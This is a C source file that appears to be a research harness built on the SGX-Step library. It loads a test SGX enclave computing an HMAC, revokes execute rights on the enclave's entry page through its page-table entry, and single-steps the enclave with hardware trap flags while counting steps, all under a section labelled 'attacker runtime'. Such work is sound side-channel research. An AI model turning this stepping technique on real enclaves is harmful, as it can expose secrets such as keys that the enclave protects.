#define _GNU_SOURCE
#include <stdio.h>
#include <signal.h>
#include <unistd.h>
#include <ucontext.h>
#include <string.h>
#include <sys/mman.h>
#include "../../urts/include/baresgx/urts.h"
#include "../../external/sgx-step/libsgxstep/debug.h"
#include "../../external/sgx-step/libsgxstep/enclave.h"
#include "../../external/sgx-step/libsgxstep/cpu.h"
#include "../../external/sgx-step/libsgxstep/pt.h"
#include "../../external/sgx-step/libsgxstep/apic.h"
#include "../../external/sgx-step/libsgxstep/cache.h"
#include "../../external/sgx-step/libsgxstep/elf_parser.h"
#include "../bare-crypto-app/enclave/test_encl.h"
#include "../bare-crypto-app/enclave/test_encl_u.h"
#include "../../trts/bare-trts/sgx_edger8r.h"

#define ENCLAVE_PATH            "../bare-crypto-app/enclave/encl.elf"
#define DEBUG			        1
#define ENCLAVE_DBG             1

void *encl_page = NULL;
uint64_t *pte_encl = 0;
int step_cnt = 0;

void aep_cb_func(void)
{
    //gprsgx_region_t gprsgx = {0};
    #if DEBUG
    	uint64_t erip = edbgrd_erip() - (uint64_t)get_enclave_base();
    	info("^^ enclave RIP=%#lx; ACCESSED=%lu", erip, ACCESSED(*pte_encl));
        //edbgrd(get_enclave_ssa_gprsgx_adrs(), &gprsgx, sizeof(gprsgx_region_t));
        //dump_gprsgx_region(&gprsgx);
        //print_enclave_info();
    #endif
}

void handle_fault(int signo, siginfo_t * si, void  *ctx)
{
    ucontext_t *uc = (ucontext_t *) ctx;

    switch ( signo )
    {
      case SIGSEGV:
        info("caught SIGSEGV; restoring trigger page access rights");
    	*pte_encl = MARK_EXECUTABLE(*pte_encl);

        if (sgx_step_do_trap) {
            exit(0);
        }

        sgx_step_do_trap = 1;
	break;

      case SIGTRAP:
        #if DEBUG
            info("Caught single-step trap (RIP=%p)\n", si->si_addr);
        #endif

        if (si->si_addr == sgx_get_aep())
            step_cnt++;

        /* ensure RFLAGS.TF is clear to disable debug single-stepping */
        uc->uc_mcontext.gregs[REG_EFL] &= ~0x100;
        break;

      default:
        info("Caught unknown signal '%d'", signo);
        abort();
    }

    // NOTE: return eventually continues at aep_cb_func and initiates
    // single-stepping mode.
    return;
}

void register_signal_handler(int signo)
{
    struct sigaction act, old_act;

    /* Specify #PF handler with signinfo arguments */
    memset(&act, 0, sizeof(sigaction));
    act.sa_sigaction = handle_fault;
    act.sa_flags = SA_RESTART | SA_SIGINFO;

    /* Block all signals while the signal is being handled */
    sigfillset(&act.sa_mask);
    ASSERT(!sigaction( signo, &act, &old_act ));
}

int main(void)
{
    void *tcs;
    struct encl_op_hmac arg_hmac;

    /************************************************************************/
    info_event("loading baresgx enclave");
    tcs = baresgx_load_elf_enclave(ENCLAVE_PATH, ENCLAVE_DBG);
    baresgx_info("loaded enclave at %p", tcs);
    print_enclave_info();
    register_symbols(ENCLAVE_PATH);

    info("dry run");

    uint8_t digest[DIGEST_LEN] = {0x0};

    char *message = "Bare-SGX rocks!";
    uint32_t message_len = strlen(message);

    arg_hmac.header_hmac.type = ENCL_OP_HMAC;
    arg_hmac.message = (uint8_t*) message;
    arg_hmac.message_len = message_len;
    arg_hmac.digest = digest;

    //baresgx_enter_enclave(tcs, (uint64_t) &arg_hmac);

    /************************************************************************/
    info_event("configuring attacker runtime");
    register_aep_cb(aep_cb_func);
    register_signal_handler( SIGSEGV );

    encl_page = get_symbol_offset("encl_entry") + get_enclave_base();
    printf("entry page at %p with value: %x \n",encl_page, *((uint64_t*) encl_page));
    ASSERT(pte_encl = remap_page_table_level(encl_page, PTE));
    ASSERT(PRESENT(*pte_encl));
    print_pte(pte_encl);

    *pte_encl = MARK_EXECUTE_DISABLE(*pte_encl);
    print_pte(pte_encl);

    /* use hardware trap flag instead of timer IRQ */
    register_signal_handler( SIGTRAP );
    set_debug_optin();

    /************************************************************************/
    info_event("single-stepping baresgx enclave");
    baresgx_enter_enclave(tcs, (uint64_t) &arg_hmac, 0);
    info("enclave returned; step_cnt=%d\n", step_cnt);
    printf("hmac=");
    dump_hex(digest, DIGEST_LEN);

    return 0;
}
